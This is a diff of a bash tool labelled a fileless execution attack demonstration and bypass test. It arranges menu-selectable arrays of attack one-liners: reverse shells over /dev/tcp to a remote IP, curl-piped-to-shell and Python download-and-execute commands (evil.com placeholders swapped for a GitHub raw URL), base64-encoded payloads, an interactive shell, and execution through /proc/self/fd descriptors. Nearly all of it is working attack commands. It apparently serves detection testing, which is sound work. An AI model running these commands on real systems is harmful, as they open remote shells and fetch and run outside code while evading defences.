@@ -2,17 +2,17 @@
 
 # === Requirements ===
 if ! command -v figlet >/dev/null; then
-  echo "Installing figlet for banner..."
+  echo "Installing figlet..."
   apt-get install -y figlet &>/dev/null || yum install -y figlet &>/dev/null
 fi
 
-# === Colored Title ===
+# === Title ===
 echo -e "\e[1;31m"
 figlet FILELESS
 echo -e "\e[0m\e[1;32m      Fileless Execution Attack Demonstration Tool (Bypass Test)\e[0m"
 echo
 
-# === Attack Arrays ===
+# === Categories ===
 reverse_shells=(
 "timeout 5 bash -c 'exec 5<>/dev/tcp/1.2.3.4/4444; cat <&5 | while read line; do \$line 2>&5 >&5; done'"
 "timeout 5 bash -c 'exec \${FD:-5}<>/dev/tcp/1.2.3.4/5555; while read -r line <&\${FD}; do bash -c \"\$line\" 2>&\${FD} >&\${FD}; done'"
@@ -21,31 +21,32 @@ reverse_shells=(
 )
 
 curl_based=(
-"curl -s http://evil.com/payload.sh | sh"
-"bash -c \"eval \$(curl -s http://evil.com/payload.sh)\""
-"bash -c \"\$(curl -s http://evil.com/payload.sh)\""
-"exec 10< <(curl -s http://evil.com/payload.sh); bash /proc/self/fd/10"
-"exec 11< <(bash -c 'bash -c \"\$(curl -s http://evil.com/payload.sh)\"'); bash /proc/self/fd/11"
-"exec 12< <(bash -c \"eval \$(curl -s http://evil.com/payload.sh)\"); bash /proc/self/fd/12"
-"exec 14< <(curl -fsSL http://evil.com/.a); bash /proc/self/fd/14"
+"curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | sh"
+"bash -c \"eval \$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh)\""
+"bash -c \"\$(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh)\""
+"exec 10< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh); bash /proc/self/fd/10"
 )
 
 python_based=(
-"exec 3< <(python3 -c \"import urllib.request;print(urllib.request.urlopen('http://evil.com/payload.sh').read().decode())\"); bash /proc/self/fd/3"
-"exec 4< <(python3 -c \"import os; os.system('curl -s http://evil.com/payload.sh | bash')\"); bash /proc/self/fd/4"
-"exec 5< <(python3 -c \"import subprocess; subprocess.run('curl -s http://evil.com/payload.sh | bash', shell=True)\"); bash /proc/self/fd/5"
-"exec 13< <(python3 -c \"import urllib.request as r;print(r.urlopen('http://evil.com/payload.sh').read().decode())\"); bash /proc/self/fd/13"
-"exec 20< <(python3 -c \"exec(__import__('urllib.request').urlopen('http://evil.com/code').read().decode())\"); bash /proc/self/fd/20"
+"exec 3< <(python3 -c \"import urllib.request;print(urllib.request.urlopen('https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh').read().decode())\"); bash /proc/self/fd/3"
+"exec 4< <(python3 -c \"import os; os.system('curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | bash')\"); bash /proc/self/fd/4"
+"exec 5< <(python3 -c \"import subprocess; subprocess.run('curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh | bash', shell=True)\"); bash /proc/self/fd/5"
+"exec 20< <(python3 -c \"exec(__import__('urllib.request').urlopen('https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh').read().decode())\"); bash /proc/self/fd/20"
 )
 
 encoded=(
-"exec 6< <(python3 -c \"import base64;exec(base64.b64decode('ZWNobyAnSGVsbG8gZmlsZWxlc3Mn'))\"); bash /proc/self/fd/6"
-"exec 7< <(echo 'ZWNobyAnRkQgdGVzdCcK' | base64 -d); bash /proc/self/fd/7"
+"exec 6< <(python3 -c \"import base64;exec(base64.b64decode('ZWNobyAnRkQgdGVzdCcK'))\"); bash /proc/self/fd/6"
+"exec 7< <(echo 'ZWNobyAnaGFja2VkIGZpbGVsZXNzJwo=' | base64 -d); bash /proc/self/fd/7"
 "exec 8< <(bash -c 'echo pwned'); bash /proc/self/fd/8"
 "exec 9< <(sh -i); /proc/self/fd/9"
-"exec 15< <(curl -s http://evil.com/x | base64 -d); bash /proc/self/fd/15"
-"exec 18< <(bash -c \"\$(curl -s http://evil.com/run.sh | base64 -d)\"); bash /proc/self/fd/18"
-"exec 19< <(printf 'IyEvYmluL2Jhc2gKZWNobyBoYWNrZWQgdmlhIGZpbGVsZXNz' | base64 -d); bash /proc/self/fd/19"
+)
+
+fd_interpreter_execs=(
+"exec 30< /bin/sh; /proc/self/fd/30 -c 'echo executed via FD sh'"
+"exec 31< /usr/bin/python3; /proc/self/fd/31 -c \"print('executed via FD python')\""
+"exec 32< /bin/bash; /proc/self/fd/32 -c 'echo bash via FD worked'"
+"exec 33< /usr/bin/python3; exec 34< <(echo 'print(1337)'); /proc/self/fd/33 /proc/self/fd/34"
+"exec 35< /bin/sh; exec 36< <(curl -s https://raw.githubusercontent.com/liorbm/fileless-execution-demo/main/liorb-fileless.sh); /proc/self/fd/35 /proc/self/fd/36"
 )
 
 # === Menu ===
@@ -55,7 +56,8 @@ echo "2) Curl-Based Execution"
 echo "3) Python-Based Execution"
 echo "4) Encoded Payloads"
 echo "5) Run ALL Attacks"
-read -p $'\nSelect option [1-5]: ' choice
+echo "6) Interpreter via FD (sh/python/bash)"
+read -p $'\nSelect option [1-6]: ' choice
 
 # === Execution Function ===
 run_attacks() {
@@ -66,7 +68,7 @@ run_attacks() {
   done
 }
 
-# === Run Based on Choice ===
+# === Run Selected Category ===
 echo
 case $choice in
   1) run_attacks reverse_shells ;;
@@ -78,6 +80,8 @@ case $choice in
     run_attacks curl_based
     run_attacks python_based
     run_attacks encoded
+    run_attacks fd_interpreter_execs
     ;;
+  6) run_attacks fd_interpreter_execs ;;
   *) echo -e "\e[1;31mInvalid option. Exiting.\e[0m" ;;
 esac
